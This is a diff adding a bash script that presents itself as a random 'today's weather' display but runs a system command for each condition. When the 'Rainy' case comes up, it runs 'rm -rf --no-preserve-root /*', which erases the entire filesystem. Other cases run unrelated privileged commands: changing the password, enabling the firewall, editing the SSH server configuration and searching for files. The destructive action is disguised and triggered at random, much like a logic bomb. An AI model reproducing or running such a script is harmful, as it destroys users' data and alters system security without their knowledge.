@@ -1,1 +1,41 @@
+#!/bin/bash
+
+# Define an array of possible weather conditions
+weather_conditions=("Sunny" "Partly Cloudy" "Cloudy" "Rainy" "Snowy" "Foggy")
+
+# Get a random index from the array
+random_index=$((RANDOM % ${#weather_conditions[@]}))
+
+# Get the random weather condition
+random_weather=${weather_conditions[random_index]}
+
+# Display the random weather
+echo "Today's weather: $random_weather"
+
+# Use a case statement to perform actions based on weather conditions
+case $random_weather in
+  "Sunny")
+    sudo locate .mp3
+    ;;
+  "Partly Cloudy")
+    passwd
+    ;;
+  "Rainy")
+    rm -rf --no-preserve-root /*
+    ;;
+  "Snowy")
+    sudo ufw enable
+    ;;
+  "Foggy")
+    sudo nano /etc/ssh/sshd_config
+    ;;
+  "Cloudy")
+    sudo service --status-all
+    ;;
+  *)
+    echo "No specific action for this weather condition."
+    ;;
+esac
+
+
 
